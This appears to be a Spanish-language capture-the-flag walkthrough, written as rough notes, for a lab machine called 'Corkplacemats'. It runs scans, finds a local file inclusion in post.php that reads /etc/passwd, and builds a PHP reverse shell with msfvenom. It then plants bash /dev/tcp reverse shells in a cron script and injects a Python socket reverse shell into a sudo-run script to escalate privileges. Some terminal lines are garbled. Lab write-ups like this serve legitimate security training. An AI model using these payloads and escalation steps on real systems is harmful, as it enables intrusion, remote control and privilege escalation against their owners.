

nmap

```
nmap -Pn -n -sV -sC -O -p21,22,80 10.67.155.146
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-07 17:21 -03
Nmap scan report for 10.67.155.146
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 34:60:60:da:c4:f8:1e:41:79:9f:0d:ab:5c:49:0d:ca (RSA)
|   256 2d:55:cf:1f:b1:48:08:18:3a:76:da:71:0e:45:89:d8 (ECDSA)
|_  256 cd:f8:8c:b3:e0:78:51:c3:f4:2f:4c:50:48:f8:9b:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Jekyll v4.1.1
|_http-title: Corkplacemats
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (96%), Google Android 10.X|11.X|12.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3
Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.50 seconds


```

puerto 80:

![[Pasted image 20260207173755.png]]
pruebas basicas en la pagina no mostro nada raro.

gobuster para buscar directorios
```
gobuster dir  -u http://10.67.155.146/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
-x txt,php,html,js -t 100

/images               (Status: 301) [Size: 315] [--> http://10.67.155.146/images/]
/index.php            (Status: 200) [Size: 4826]
/post.php             (Status: 200) [Size: 2422]
/css                  (Status: 301) [Size: 312] [--> http://10.67.155.146/css/]
/robots.txt           (Status: 200) [Size: 69]
/bunch.php            (Status: 200) [Size: 3445]
/round.php            (Status: 200) [Size: 3440]

```

###### post.php
prueba para ver si hay lfi
```
ffuf -u "http://10.67.155.146/post.php?FUZZ=../../../../etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs 2422  -v
```

lfi en endpoint post
```

http://10.67.155.146/post.php?post=../../../../etc/passwd
```

![[Pasted image 20260207173901.png]]
###### 

secref_file_do_notread
![[Pasted image 20260207181442.png]]


path descubierto hasta server ftp
```
http://10.67.155.146/post.php?post=../../../../home/ftpuser/ftp/files/rce_test.php
```
###### payload
msfvenom -p php/reverse_php LHOST=192.168.167.92 LPORT=4444 -o shell.php

###### users

```
╔══════════╣ Users with console
mat:x:1002:1002:,#,,:/home/mat:/bin/bash                                                                                                                                                     
root:x:0:0:root:/root:/bin/bash
toby:x:1003:1003:,,,:/home/toby:/bin/bash
ubuntu:x:1004:1005:Ubuntu:/home/ubuntu:/bin/bash
will:x:1000:1000:will:/home/will:/bin/bash


```



www
```

User www-data may run the following commands on ip-10-67-155-146:
    (toby) NOPASSWD: ALL

```


mat
```
meterpreter > cat note.txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
meterpreter > pwd
/home/mat

*/1 * * * * mat /home/toby/jobs/cow.sh

#reverse-shell 
-rwxr-xr-x 1 toby toby   46 Dec  3  2020 cow.sh
toby@ip-10-67-155-146:~/jobs$ nano cow.sh 
toby@ip-10-67-155-146:~/jobs$ cat cow.sh 92/1235 0>&1'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.167.92/1235 0>&1'
toby@ip-10-67-155-146:~/jobs$ cat cow.sh 
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.167.92/1235 0>&1


para escalar a will modifique un script por que tenia permisos de ejecucion con python



cat > /home/mat/scripts/cmd.py << EOF
def get_command(num):
        import os
        os.system("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.167.92\",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")' &")
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
EOF



```

toby
```
meterpreter > cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
meterpreter > pwd
/home/toby

2/1234 0>&1'
<h -c 'bash -i >& /dev/tcp/192.168.167.92/1234 0>&1'


```


